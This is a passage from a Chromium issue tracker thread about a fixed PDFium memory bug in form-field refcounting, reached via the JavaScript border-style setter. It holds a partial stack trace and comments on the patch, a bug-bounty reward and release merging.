    #2 0x55ed399371e7 in fxcrt::Retainable::Release() ./../../third_party/pdfium/core/fxcrt/retain_ptr.h:122:7
    #3 0x55ed39a6c09b in fxcrt::ReleaseDeleter<CPDF_Object>::operator()(CPDF_Object*) const ./../../third_party/pdfium/core/fxcrt/retain_ptr.h:20:47
    #4 0x55ed39a6c038 in std::__Cr::unique_ptr<CPDF_Object, fxcrt::ReleaseDeleter<CPDF_Object> >::reset(CPDF_Object*) ./../../buildtools/third_party/libc++/trunk/include/memory:2651:7
    #5 0x55ed39d544ac in fxcrt::RetainPtr<CPDF_Object>::operator=(fxcrt::RetainPtr<CPDF_Object>&&) ./../../third_party/pdfium/core/fxcrt/retain_ptr.h:69:12
    #6 0x55ed39cdb95b in CPDF_Dictionary::SetFor(fxcrt::ByteString const&, fxcrt::RetainPtr<CPDF_Object>) ././../../third_party/pdfium/core/fpdfapi/parser/cpdf_dictionary.cpp:216:27
    #7 0x55ed39a58b93 in std::__Cr::enable_if<CanInternStrings<CPDF_Array>::value, CPDF_Array*>::type CPDF_Dictionary::SetNewFor<CPDF_Array>(fxcrt::ByteString const&) ./../../third_party/pdfium/core/fpdfapi/parser/cpdf_dictionary.h:92:28
    #8 0x55ed39cf8eb0 in CPDF_Dictionary::SetMatrixFor(fxcrt::ByteString const&, CFX_Matrix const&) ././../../third_party/pdfium/core/fpdfapi/parser/cpdf_dictionary.cpp:269:24
    #9 0x55ed3a6f0941 in CPWL_AppStream::Write(fxcrt::ByteString const&, fxcrt::ByteString const&, fxcrt::ByteString const&) ././../../third_party/pdfium/fpdfsdk/pwl/cpwl_appstream.cpp:1941:16
    #10 0x55ed3a6e8324 in CPWL_AppStream::SetAsPushButton() ././../../third_party/pdfium/fpdfsdk/pwl/cpwl_appstream.cpp:1248:3
    #11 0x55ed3a3c18e7 in CPDFSDK_Widget::ResetAppearance(pdfium::Optional<fxcrt::WideString>, bool) ././../../third_party/pdfium/fpdfsdk/cpdfsdk_widget.cpp:603:17
    #12 0x55ed3a493556 in (anonymous namespace)::UpdateFormField(CPDFSDK_FormFillEnvironment*, CPDF_FormField*, bool, bool, bool) ././../../third_party/pdfium/fxjs/cjs_field.cpp:70:45
    #13 0x55ed3a47f47b in (anonymous namespace)::SetBorderStyle(CPDFSDK_FormFillEnvironment*, fxcrt::WideString const&, int, fxcrt::ByteString const&) ././../../third_party/pdfium/fxjs/cjs_field.cpp:223:9
    #14 0x55ed3a47ec28 in CJS_Field::set_border_style(CJS_Runtime*, v8::Local<v8::Value>) ././../../third_party/pdfium/fxjs/cjs_field.cpp:726:5
    #15 0x55ed3a5ec6a1 in void JSPropSetter<CJS_Field, &(CJS_Field::set_border_style(CJS_Runtime*, v8::Local<v8::Value>))>(char const*, char const*, v8::Local<v8::String>, v8::Local<v8::Value>, v8::PropertyCallbackInfo<void> const&) ./../../third_party/pdfium/fxjs/js_define.h:103:23
    #16 0x55ed3a529699 in CJS_Field::set_border_style_static(v8::Local<v8::String>, v8::Local<v8::Value>, v8::PropertyCallbackInfo<void> const&) ./../../third_party/pdfium/fxjs/cjs_field.h:44:3
....

### ts...@chromium.org (2019-05-03)

I put up a patch a few days ago to fix all of these at https://pdfium-review.googlesource.com/c/pdfium/+/53890 but we're waiting to be sure that the prerequisite patch at https://pdfium-review.googlesource.com/c/pdfium/+/53750 sticks.

### na...@google.com (2019-05-06)

[Empty comment from Monorail migration]

### ts...@chromium.org (2019-05-06)

So, the proper refcounting in b33a01115c should have resolved all of these cases. As always, we'd be eager to know if you find others.

### na...@google.com (2019-05-09)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-05-09)

Congrats! The Panel decided to reward $6,000 for this report :) 

### na...@google.com (2019-05-09)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-06-14)

Not requesting merge to M76 because latest trunk commit (655111) appears to be prior to beta branch point (665002). If this is incorrect, please replace the Merge-na label with Merge-Request-76. If other changes are required to fix this bug completely, please request a merge if necessary.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### th...@chromium.org (2019-07-23)

r656581, still before the M76 branch, is also relevant to this bug. For some reason, Bugdroid didn't pick it up and comment about it here.

### th...@chromium.org (2019-07-23)

[Empty comment from Monorail migration]

### ad...@google.com (2019-07-29)

[Empty comment from Monorail migration]

### ad...@chromium.org (2019-07-30)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-08-07)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@chromium.org (2019-11-23)

[Empty comment from Monorail migration]

### is...@google.com (2019-11-23)

This issue was migrated from crbug.com/chromium/956947?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/986109]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40094748)*
